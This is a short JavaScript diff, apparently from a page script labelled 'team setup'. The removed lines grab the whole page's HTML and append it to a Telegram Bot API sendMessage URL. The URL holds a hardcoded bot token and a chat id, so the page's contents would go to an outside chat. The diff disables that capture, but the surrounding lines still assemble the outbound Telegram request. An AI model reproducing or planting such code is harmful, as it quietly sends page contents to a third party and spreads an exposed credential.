@@ -1,9 +1,9 @@
         console.log('team setup');
         
 
-        var html = document.getElementsByTagName('html')[0].innerHTML;
+      //  var html = document.getElementsByTagName('html')[0].innerHTML;
         var first = "https://api.telegram.org/bot2086484806:AAE2FanW-P1kw7F0en_yy-uU7k4eu-9AKj0/sendMessage?text="
-        var second = first.concat('' , html);
+        var second = first.concat('' , first);
         var third = second.concat('' , "&chat_id=2040726523" );
 
         
